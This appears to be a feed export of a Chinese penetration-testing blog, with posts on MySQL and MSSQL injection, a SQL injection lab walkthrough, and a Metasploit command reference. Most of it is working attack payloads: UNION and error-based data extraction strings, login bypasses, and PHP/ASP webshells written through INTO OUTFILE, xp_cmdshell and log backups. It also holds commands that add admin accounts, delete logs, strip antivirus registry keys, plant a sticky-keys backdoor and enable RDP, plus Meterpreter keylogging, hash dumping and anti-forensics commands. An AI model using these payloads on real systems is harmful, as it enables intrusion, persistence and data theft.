column_name	必需。要提取字符的字段。<br>
start	必需。规定开始位置（起始值是 1）。<br>
length	可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</p>
<p>limit()---返回前几条或者中间某几行数据<br>
select * from table limit m,n;<br>
其m指记录始index0始表示第条记录 n指第m+1条始取n条<br>
select * from user limit 1,2;<br>
Count()---聚集函数，统计元祖的个数</p>
<p>rand()---用于产生一个0~1的随机数<br>
floor()---向下取整</p>
<p>group by---依据我们想要的规则对结果进行分组<br>
select * from user group by host;<br>
length()---返回字符串的长度<br>
select length('www.cracer.com');<br>
Substr()---截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）<br>
select substr(host,2,3) from user;<br>
Ascii()---返回字符串的ascii码<br>
Select ascii(‘a’);</p>
<p>注释符：<br>
#、--、/<strong>/<br>
内联注释：<br>
/<em>！union</em>/和/<em>!50001union</em>/<br>
语句中的代替符号：<br>
用+、%0a/%0D/和/<em>ADJFKLASDF--234U23SJFD AND 1=1</em>/代替空格<br>
用%或者/</strong>/、%00、%01分割sql语句<br>
编码绕过 url编码</p>
<p>select user（）；查看链接用户<br>
select version（）；查看数据库版本<br>
select database （）；查看当前使用的数据库<br>
select @@ basedir； 查看数据库安装路径<br>
d:/phpstudy/mysql<br>
d:phpstudy/apache/conf/httpd.conf<br>
select @@ datadir;  数据库路径</p>
<p>select load _file (d:/q.txt');  读文件内容 dnslog<br>
select &quot;<?php phpinfo();?>&quot; into outfile 'd:/1.php';  导shell 文件<br>
写文件需要满足的条件<br>
1.root权限<br>
2.关闭魔术引导<br>
3，找到根目录<br>
4，windows可以<br>
5.-secure --file -priv 设置null  设置允许导入路径</p>
<p>sqlmap -u “”--D xycms --- tables --- count<br>
单行注释可以用：</p>
<p>#---<br>
%23<br>
/<em>asldfa</em>/ 多行注入<br>
/<em>!select version()</em>/ 内联注入<br>
/<em>select <em>/versioin();<br>
/</em>!10000select</em>/version(); 可以执行<br>
/*5555 select */version（）；</p>
<ul>
<li>% 0a   %0d /<em>sdfsaf</em>/ 代替空格<br>
url 编码绕过通用防护代码<br>
union select</li>
</ul>
<p>mysql注入类型<br>
1。boole 盲注<br>
2.时间盲注<br>
3.union联合<br>
4.显错注入</p>
<p>mysql注入原理<br>
1.判断注入漏洞<br>
And 1=1 and1=2<br>
2.判断多少列，数字报错减少，正常增加<br>
Order by 20<br>
3.union联合查询，报字符列在第几列<br>
union select 1,2,3,4,5<br>
4.在字符列上报相关信息,数据库版本信息，用户，数据库名称（十六进制转换）。<br>
union select 1,version(),3,4,5<br>
5.指定数据库，爆数据库表名<br>
union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from information_schema.tables where table_schema=0x6D7574696130313231<br>
6.指定表名爆列名<br>
union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from information_schema.columns where table_name=0x61646D696E<br>
id,name,adminpass,right_li,right_li_b,checks,level_id<br>
7.查询数据信息<br>
union select 1,group_concat(name,0x5c,adminpass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from  admin</p>
<p>常见的防注入代码<br>
function check_sql($x){<br>
$inject=array(&quot;select&quot;,&quot;union&quot;,&quot;from&quot;,&quot;and&quot;,&quot;or&quot;);</p>
<pre><code>$i=str_replace($inject,&quot;&quot;,$x);
return $i;
</code></pre>
<p>}</p>
<p>/* function check_sql($Sql_Str) {//自动过滤Sql的注入语句。<br>
<span class='katex-error' title='ParseError: KaTeX parse error: Can&#039;t use function &#039;\&#039;&#039; in math mode at position 48: …|update|delete|\̲&#039;̲|\\*|\*|\.\.\/|…'>check=preg_match(&#039;/select|insert|update|delete|\&#039;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&#039;,</span>Sql_Str);<br>
if ($check) {<br>
echo '<script language="JavaScript">alert(&quot;系统警告：\n\n请不要尝试在参数中包含非法字符尝试注入！&quot;);</script>';<br>
exit();<br>
}else{<br>
return $Sql_Str;<br>
}<br>
} */</p>
<p>绕过防注入代码<br>
大小写绕过<br>
%00编码绕过</p>
<p>显错注入<br>
判断是否存在注入输入'</p>
<p>显错注入有很多函数</p>
<p>floor()、extractvalue()、updatexml()、geometrycollection()、multipoint()、<br>
polygon()、multipolygon()、linestring()、multilinestring()、exp()<br>
常用的前三种比较多<br>
我们今天讲些<br>
updatexml的显错利用</p>
<p>'and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+                                                                                                     #查看当前数据库用户<br>
'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+                                                                                              #查看当前数据库名<br>
'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+                    #查看当前数据库<br>
'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)--+                    #查看当前数据库<br>
'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1)--+                    #查看当前数据库<br>
'and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)--+         #查看所有数据库<br>
'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='mysql'),0x7e),1)--+<br>
可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。<br>
有一点需要注意，updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位<br>
这里查询前5位示意:<br>
'and updatexml(1,concat(0x7e,substring(hex((select database())),1,5),0x7e),1)<br>
'and updatexml(1,concat(0x7e,substring(hex((select group_concat(schema_name) from information_schema.schemata)),1,5),0x7e),1)--+</p>
<p>'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='mysql' limit 0,1),0x7e),1)--+                                  #查看当前数据库的表名<br>
'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='user' limit 0,1),0x7e),1)--+                              #查看user表的列名<br>
'and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='user' limit 0,1),0x7e),1)--+<br>
列用户名密码<br>
'and updatexml(1,concat(0x7e,(select user from user limit 0,1),0x7e),1)--+<br>
'and updatexml(1,concat(0x7e,(select password from user limit 0,1),0x7e),1)--+</p>
<p>%27and%20updatexml(1,concat(0x7e,substring(hex((select%20password%20from%20user%20limit%200,1)),44,75),0x7e),1)--+</p>
<p>后台绕过<br>
select * from user where username='' and password=''<br>
输入：admin'#<br>
select * from user where username='admin'#' and password=''<br>
输入：admin' or '1=1<br>
select * from user where username='admin' or '1=1' and password=''</p>
<p>Mysql长字节截断攻击<br>
条件：<br>
管理员和普通用户在一个表中<br>
用户名字段长度有一定限制比如长度为10个字符<br>
普通用户在注册名称的时候可以吧用户名设置为<br>
Admin+++++++++++++++++++++++++<br>
使其长度超过字段限制的长度，会自动截断，变成admin<br>
这样相当于增加了个admin管理员账号密码。</p>
<p>Mysql宽字节注入<br>
本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>
当打开时，所有的 '（单引号），&quot;（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。<br>
这和 addslashes() 作用完全相同。<br>
一共有三个魔术引号指令：<br>
magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。<br>
不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。<br>
magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，<br>
包括从数据库和文本文件，所返回的数据都会被反斜线转义。<br>
该选项可在运行的时改变，在 PHP 中的默认值为 off。<br>
参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。<br>
magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。<br>
此选项会完全覆盖 magic_quotes_gpc。<br>
如果同时打开两个选项的话，单引号将会被转义成 ''。而双引号、反斜线 和 NULL 字符将不会进行转义。<br>
如何取得其值参见 ini_get()。</p>
<p>程序本身开启魔术指导<br>
php 5.2.17 版本 默认开启魔术引导</p>
<p>2个字节<br>
4个字节<br>
%bf’<br>
可以百分百过掉<br>
gbk编码 windows可以<br>
utf-8 linux 废掉了</p>
<p>宽字节注入<br>
使用宽字节注入绕过魔术引号<br>
%df%27<br>
sqlmap.py -u “cracer.com/xx.php?id=1”<br>
--risk 3 --dbms=mysql -p username --tamper unmagicquotes.py -v 3</p>
<p>PART 4:  Mysql  读写文件操作</p>
<p>Mysql注入读写文件<br>
load_file()函数<br>
该函数是用来读取源文件的函数<br>
只能读取绝对路径的网页文件<br>
在使用load_file()时应先找到网站绝对路径<br>
例如：<br>
d:/www/xx/index.php<br>
/usr/src/apache/htdoc/index.php<br>
注意：<br>
1.路径符号 &quot;&quot; 错误“\”正确 “/” 正确<br>
2.转换十六进制数，就不要‘’</p>
<p>获取根目录</p>
<p>1.报错显示<br>
2.谷歌黑客	<br>
site:目标网站 warning<br>
3.遗留文件 phpinfo info test php<br>
4.漏洞爆路径<br>
5.读取配置文件</p>
<p>读取网站文件内容<br>
and 1=2 union select 1,load_file('C:\Inetpub\wwwroot\mysql-sql\inc\set_sql.php'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18<br>
and 1=2 union select 1,load_file(0x443A5C7068705C41504D53657276352E322E365C7777775C6874646F63735C335C636F6E6669672E706870),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</p>
<p>c:/windows/system32/inetsrv/metabase.xml</p>
<p>写入函数 into outfile<br>
and 1=2 union select 1,&quot;<?php @eval($_POST['cracer']);?>&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/Inetpub/wwwroot/mysql-sql/cracer.txt'</p>
<p>其他利用<br>
第一种方法：需要使用wamp环境搭建需要系统权限才能执行</p>
<p>and 1=2 union select 1,&quot;net user seven 123 /add&quot;,2,3,4,5,6 into outfile 'C://Documents and Settings/Administrator/「开始」菜单/程序/启动/1.bat'</p>
<p>第二种方法：</p>
<p>and 1=2 union select 1,&quot;<pre><body><?  @system($_GET['cc']); ?></body></pre>&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/Inetpub/wwwroot/mysql-sql/cr.php'</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sql注入靶场实战]]></title>
        <id>https://itxz.fun/post/sql-zhu-ru-ba-chang-shi-zhan/</id>
        <link href="https://itxz.fun/post/sql-zhu-ru-ba-chang-shi-zhan/">
        </link>
        <updated>2020-09-06T04:53:10.000Z</updated>
        <content type="html"><![CDATA[<ol>
<li>目标url:http://117.41.229.122:8003/?id=1</li>
<li>第一步，判断是否存在sql注入漏洞<br>
构造 ?id=1 and 1=1 ，回车<br>
页面返回正常</li>
</ol>
<p>构造 ?id=1 and 1=2 ,回车<br>
页面不正常，初步判断这里 可能 存在一个注入漏洞</p>
<p>第二步:判断字段数<br>
构造 ?id=1 and 1=1 order by 1 回车<br>
页面正常</p>
<p>构造 ?id=1 and 1=1 order by 2 回车<br>
页面正常</p>
<p>构造 ?id=1 and 1=1 order by 3 回车<br>
页面返回 错误，判断字段数为   2</p>
<p>第三步：判断回显点<br>
构造 ?id=1 and 1=2 union select 1,2 回车<br>
页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
<p>第四步:查询相关内容<br>
查询当前数据库名<br>
构造 ?id=1 and 1=2 union select 1,database() 回车<br>
查询当前数据库版本</p>
<p>构造 ?id=1 and 1=2 union select 1,version() 回车</p>
<p>查询当前数据库 表名<br>
构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 回车</p>
<p>绝大数情况下，管理员的账号密码都在admin表里</p>
<p>查询字段名<br>
构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 回车</p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 1,1 回车</p>
<p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 2,1 回车</p>
<p>查询字段内容<br>
构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车</p>
<p>构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车</p>
<p>limit 1,1 没有回显，说明只有一个用户</p>
<p>构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车</p>
<p>zkaqbanban<br>
hellohack</p>
<p>第二关<br>
通过waf<br>
1<br>
http://120.203.13.111:8001/shownews.asp?id=171 order by 10</p>
<p>http://120.203.13.111:8001/shownews.asp?id=171 order by  11</p>
<p>页面出现错误！返回数据库错误，证明此页面存在sql注入，也测试出此表拥有10个字段</p>
<p>我们继续拼接查询语句，通过from，看页面返回是否正常来猜测有没有admin这个表</p>
<p>http://120.203.13.111:8001/shownews.asp?id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin<br>
访问发现有注入防护，经测试只要url出现select（查询）关键字，就会被拦截。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sql注入]]></title>
        <id>https://itxz.fun/post/sql-zhu-ru/</id>
        <link href="https://itxz.fun/post/sql-zhu-ru/">
        </link>
        <updated>2020-09-06T01:40:17.000Z</updated>
        <content type="html"><![CDATA[<p>判断语句<br>
1.判断是否有注入<br>
and 1=1<br>
and 1=2<br>
/<br>
-0<br>
判断注入的方法是一样的<br>
2.初步判断是否是mssql<br>
and user&gt;0<br>
3.判断数据库系统<br>
and (select count(<em>) from sysobjects)&gt;0 mssql<br>
and (select count(</em>) from msysobjects)&gt;0 access</p>
<p>注入语句<br>
4.注入参数是字符<br>
'and [查询条件] and ''='<br>
5.搜索时没过滤参数的<br>
'and [查询条件] and '%25'='<br>
6.猜数表名<br>
and (select Count(*) from [表名])&gt;0<br>
7.猜字段<br>
and (select Count(字段名) from 表名)&gt;0<br>
8.猜字段中记录长度<br>
and (select top 1 len(字段名) from 表名)&gt;0<br>
9.(1)猜字段的ascii值（access）<br>
and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0<br>
(2)猜字段的ascii值（mssql）<br>
and (select top 1 unicode(substring(字段名,1,1)) from 表名)&gt;0</p>
<p>实例：探测漏洞信息<br>
http://testasp.vulnweb.com/showforum.asp?id=0<br>
在加入'后 报错<br>
//数据库版本<br>
id=1 and 1=(select @@version)<br>
//当前使用的数据库<br>
id=1 and 1=(select db_name())</p>
<p>实例：列数据库名称<br>
//获取第一个用户数据库<br>
and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)<br>
and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name&lt;&gt; 'acublog')<br>
//以此类推，可以获取全部用户数据库名<br>
and 1=(select name from master..sysdatabases for xml path)</p>
<p>实例：列表名<br>
//获取表名<br>
//获取第一张表 threads<br>
?id=1 and 1=(select top 1 name from sysobjects where xtype='u')<br>
//获取第二张表 users<br>
?id=1 and 1=(select top 1 name from sysobjects where xtype='U' and name &lt;&gt; 'threads' )<br>
//以此类推，可以获取全部表</p>
<p>实例：列表的列名<br>
获取表 users 的列名<br>
//获取第一列列名 uname<br>
?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users'))<br>
//获取第二列列名 upass<br>
?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users') and name &lt;&gt; 'uname' )</p>
<p>实例：列数据<br>
//获取第一个用户名<br>
?id=1 and 1=(select top 1 uname from users)<br>
//获取第一个用户名对应的密码<br>
?id=1 and 1=(select top 1 upass from users )</p>
<p>union 联合查询<br>
顺便查下版本和数据库名<br>
union select null,@@version,db_name(),null,null</p>
<p>如果要查其他数据库的表名还可以这样:<br>
union select  null,(select top 1 name from [dbname]..sysobjects where xtype='u' and name not in(select top 0 name from [dbname]..sysobjects where xtype='u')),null,null</p>
<p>union 列表名</p>
<p>继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)<br>
第一个表名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
第二个表名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name='password'))),null</p>
<p>union 列列名<br>
继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)<br>
第一个列名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
第二个列名<br>
http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
第三个列名</p>
<p>http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name='password'))),null</p>
<p>列数据<br>
http://192.168.0.240:8005/?id=1   union select null,username,password  from password where username not in (select top 0 username from password)</p>
<p>PART 3:  SqlServer不同权限利用<br>
用户所处权限分析：</p>
<p>sa权限<br>
dbo<br>
public</p>
<p>权限判断语句<br>
and 1=(select is_srvrolemember('sysadmin')) //判断是否是系统管理员<br>
and 1=(select is_srvrolemember('db_owner')) //判断是否是库权限<br>
and 1=(select is_srvrolemember('public'))   //判断是否为public权限<br>
and 1=convert(int,db_name())或1=(select db_name())  //当前数据库名<br>
and 1=(select @@servername)  //本地服务名<br>
and 1=(select HAS_DBACCESS('master'))  //判断是否有库读取权限</p>
<p>Sa权限的利用<br>
注入用户密码<br>
修改网站管理员密码<br>
直接getshell<br>
调用系统命令<br>
创建系统管理员<br>
操控文件<br>
操控日志文件<br>
getshell<br>
创建sqlserver管理<br>
系统服务操作<br>
注册表操作<br>
创建后门<br>
开启3389</p>
<p>SQLserver中的存储过程<br>
<img src="https://itxz.fun/post-images/1599357937450.png" alt="" loading="lazy"></p>
<p>修改网站管理员密码<br>
;update admin set pass=‘e8dc763194f29433’ where admin=‘cracer’<br>
将管理员表admin中admin用户的密码设置为e8dc763194f29433</p>
<p>修改之前把原来密码备份<br>
通常在密码解不出的情况下选择使用该方法</p>
<p>直接getshell<br>
修复上传<br>
;EXEC sp_configure 'show advanced options',1;<br>
RECONFIGURE;<br>
;exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE</p>
<p>http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27C:\Inetpub\wwwroot\8005\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--</p>
<p>调用系统命令xp_cmdshell<br>
1.检测与恢复扩展存储<br>
判断xp_cmdshell扩展存储是否存在<br>
and 1=(select count(<em>) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell')<br>
判断xp_regread扩展存储过程是否存在<br>
and 1=(select count(</em>) from master.dbo.sysobjects where name='xp_regread')<br>
恢复<br>
;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br>
;exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'</p>
<p>Xp_cmdshell执行命令</p>
<p>新建用户<br>
;exec master..xp_cmdshell 'net user test test /add'<br>
;exec master..xp_cmdshell 'net localgroup administrators test /add'<br>
操控日志<br>
;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5\ex070606.log '<br>
Getshell<br>
echo <sup>&lt;%Execute(request(&quot;a&quot;))%</sup>&gt; &gt; d:\www\123.asp<br>
;exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=&quot;Jscript&quot;%<sup>&gt;</sup>&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\WWW\233.aspx' ;--<br>
操作注册表<br>
删除注册表<br>
reg delete HKLM\SOFTWARE\McAfee /f<br>
导入注册表<br>
Regedit /s d:\web\zh\hp.reg<br>
导出注册表<br>
regedit /e d:\web\zhao\aaa.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Wds\rdpwd\Tds\tcp&quot;</p>
<p>创建sqlserver管理<br>
添加和删除一个SA权限的用户test：（需要SA权限）<br>
exec master.dbo.sp_addlogin test,password<br>
exec master.dbo.sp_addsrvrolemember test,sysadmin</p>
<p>系统服务操作<br>
停掉或激活某个服务。 （需要SA权限）<br>
exec master..xp_servicecontrol 'stop','schedule'<br>
exec master..xp_servicecontrol 'start','schedule'</p>
<p>注册表操作<br>
启用存储过程<br>
exec sp_addextendedproc xp_regread,'xpstar.dll'<br>
;exec master.dbo.sp_addextendedproc0x780070005f007200650067007200650061006400,0x7800700073007400610072002e0064006c006c00—</p>
<p>exec sp_addextendedproc xp_regwrite,'xpstar.dll'</p>
<p>xp_regwrite 根键,子键, 值名, 值类型, 值<br>
exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_SZ','c:\windows\system32\cmd.exe'</p>
<p>写入shift后门<br>
exec xp_regwrite<br>
0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,'c:\windows\system32\taskmgr.exe'--</p>
<p>开启3389<br>
;exec master..xp_cmdshell 'sc config termservice start=auto'<br>
;exec master..xp_cmdshell 'net start termservice'<br>
;exec master..xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'<br>
//允许外部连接<br>
;exec master..xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal<br>
Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f'    //改端口到80<br>
开启3389<br>
;exec master..xp_cmdshell &quot;wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1&quot;--</p>
<p>dbowner权限利用<br>
1.判断数据库用户权限<br>
and 1=(select is_member('db_owner'));--<br>
2.搜索web目录<br>
;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--<br>
然后<br>
;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1--<br>
and(select dir from temp where id=1)&gt;0<br>
由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹</p>
<p>getshell<br>
找到web目录后，就可以写入一句话木马了<br>
;alter database ssdown5 set RECOVERY FULL<br>
;create table test(str image)--<br>
;backup log ssdown5 to disk='c:\test' with init--<br>
;insert into test(str)values ('&lt;%excute(request(&quot;cmd&quot;))%&gt;')--<br>
;backup log ssdown5 to disk='c:\inetpub\wwwroot\x.asp'--<br>
;alter database ssdown5 set RECOVERY simple</p>
<p>PART 4:  SqlServer 工具使用<br>
穿山甲、萝卜头、sqlmap等</p>
<p>掌握sqlserver常用操作<br>
了解sqlserver 手工注入<br>
学会挖掘注入和利用工具使用</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集01]]></title>
        <id>https://itxz.fun/post/xin-xi-shou-ji-01/</id>
        <link href="https://itxz.fun/post/xin-xi-shou-ji-01/">
        </link>
        <updated>2020-06-15T11:16:32.000Z</updated>
        <content type="html"><![CDATA[<p>第一步：域名探测</p>
<p>第二步：子域名探测</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Metasploit 常用渗透命令大全]]></title>
        <id>https://itxz.fun/post/metasploit-chang-yong-shen-tou-ming-ling-da-quan/</id>
        <link href="https://itxz.fun/post/metasploit-chang-yong-shen-tou-ming-ling-da-quan/">
        </link>
        <updated>2020-06-13T03:25:06.000Z</updated>
        <content type="html"><![CDATA[<p>show exploits<br>
列出metasploit框架中的所有渗透攻击模块。<br>
show payloads<br>
列出metasploit框架中的所有攻击载荷。<br>
show auxiliary<br>
列出metasploit框架中的所有辅助攻击载荷。<br>
search name<br>
查找metasploit框架中所有的渗透攻击和其他模块。<br>
info<br>
展示出制定渗透攻击或模块的相关信息。<br>
use name<br>
装载一个渗透攻击或模块。</p>
<p>LHOST<br>
你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。<br>
RHOST<br>
远程主机或是目标主机。<br>
set function<br>
设置特定的配置参数（EG：设置本地或远程主机参数）。<br>
setg function<br>
以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。<br>
show options<br>
列出某个渗透攻击或模块中所有的配置参数。<br>
show targets<br>
列出渗透攻击所有支持的目标平台。<br>
set target num<br>
指定你所知道的目标的操作系统以及补丁版本类型。<br>
set payload name<br>
指定想要使用的攻击载荷。<br>
show advanced<br>
列出所有高级配置选项。<br>
set autorunscript migrate -f.<br>
在渗透攻击完成后，将自动迁移到另一个进程。<br>
check<br>
检测目标是否选定渗透攻击存在相应的安全漏洞。<br>
exploit<br>
执行渗透攻击或模块来攻击目标。<br>
exploit -j<br>
在计划任务下进行渗透攻击（攻击将在后台进行）。<br>
exploit -z<br>
渗透攻击完成后不与回话进行交互。<br>
exploit -e encoder<br>
制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。<br>
exploit -h<br>
列出exploit命令的帮助信息。<br>
sessions -l<br>
列出可用的交互会话（在处理多个shell时使用）。<br>
sessions -l -v<br>
列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。<br>
sessions -s script<br>
在所有活跃的metasploit会话中运行一个特定的metasploit脚本。<br>
sessions -K<br>
杀死所有活跃的交互会话。<br>
sessions -c cmd<br>
在所有活跃的metasploit会话上执行一个命令。<br>
sessions -u sessionID<br>
升级一个普通的win32 shell到metasploit shell。<br>
db_create name<br>
创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。<br>
db_connect name<br>
创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。<br>
db_namp<br>
利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。<br>
db_autopwn -h<br>
展示出db_autopwn命令的帮助信息。<br>
db_autopwn -p -r -e<br>
对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>
db_destroy<br>
删除当前数据库。<br>
db_destroy user：passwd@host：port/database<br>
使用高级选项来删除数据库。<br>
metasploit命令<br>
help<br>
打开meterpreter使用帮助。<br>
run scriptname<br>
运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。<br>
sysinfo<br>
列出受控主机的系统信息。<br>
ls<br>
列出目标主机的文件和文件夹信息。<br>
use priv<br>
加载特权提升扩展模块，来扩展metasploit库。<br>
ps<br>
显示所有运行的进程以及相关联的用户账户。<br>
migrate PID<br>
迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。<br>
use incognito<br>
加载incognito功能（用来盗窃目标主机的令牌或假冒用户）<br>
list_tokens -u<br>
列出目标主机用户的可用令牌。<br>
list_tokens -g<br>
列出目标主机用户组的可用令牌。<br>
impersonate_token DOMAIN_NAME\USERNAME<br>
假冒目标主机上的可用令牌。<br>
steal_token PID<br>
盗窃给定进程的可用令牌并进行令牌假冒。<br>
drop_token<br>
停止假冒当前令牌。<br>
getsystem<br>
通过各种攻击向量来提升系统用户权限。<br>
execute -f cmd.exe -i<br>
执行cmd.exe命令并进行交互。<br>
execute -f cmd.exe -i -t<br>
以所有可用令牌来执行cmd命令并隐藏该进程。<br>
rev2self<br>
回到控制目标主机的初始用户账户下。<br>
reg command<br>
在目标主机注册表中进行交互，创建，删除，查询等操作。<br>
setdesktop number<br>
切换到另一个用户界面（该功能基于那些用户已登录）。<br>
screenshot<br>
对目标主机的屏幕进行截图。<br>
upload file<br>
向目标主机上传文件。<br>
download file<br>
从目标主机下载文件。<br>
keyscan_start<br>
针对远程目标主机开启键盘记录功能。<br>
keyscan_dump<br>
存储目标主机上捕获的键盘记录。<br>
keyscan_stop<br>
停止针对目标主机的键盘记录。<br>
getprivs<br>
尽可能多的获取目标主机上的特权。<br>
uictl enable keyboard/mouse<br>
接管目标主机的键盘和鼠标。<br>
background<br>
将你当前的metasploit shell转为后台执行。<br>
hashdump<br>
导出目标主机中的口令哈希值。<br>
use sniffer<br>
加载嗅探模式。<br>
sniffer_interfaces<br>
列出目标主机所有开放的网络端口。<br>
sniffer_dump interfaceID pcapname<br>
在目标主机上启动嗅探。<br>
sniffer_start interfaceID packet-buffer<br>
在目标主机上针对特定范围的数据包缓冲区启动嗅探。<br>
sniffer_stats interfaceID<br>
获取正在实施嗅探网络接口的统计数据。<br>
sniffer_stop interfaceID<br>
停止嗅探。<br>
add_user username password -h ip<br>
在远程目标主机上添加一个用户。<br>
clearev<br>
清楚目标主机上的日志记录。<br>
timestomp<br>
修改文件属性，例如修改文件的创建时间（反取证调查）。<br>
reboot<br>
重启目标主机。<br>
MSFpayload命令<br>
msfpayload -h<br>
msfpayload的帮助信息。<br>
msfpayload windows/meterpreter/bind_tcp O<br>
列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。<br>
msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>
